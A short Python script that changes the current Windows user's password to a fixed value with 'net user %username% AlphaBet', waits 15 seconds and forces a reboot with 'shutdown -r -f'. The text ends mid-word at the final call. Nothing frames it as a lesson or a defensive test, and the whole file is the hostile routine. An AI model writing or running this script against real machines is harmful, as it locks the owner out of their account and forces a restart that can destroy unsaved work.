import os, time

def passwd_reset():
  try:
    os.system('net user %username% AlphaBet')
    return True
  except Exception as e:
    print(f'error: {e}')
    return False
  
def restart():
  success = passwd_reset()
  
  if success:
    time.sleep(15)
    os.system('shutdown -r -f')
  else:
    print('Restarting the computer is not neccessary...')
    
resta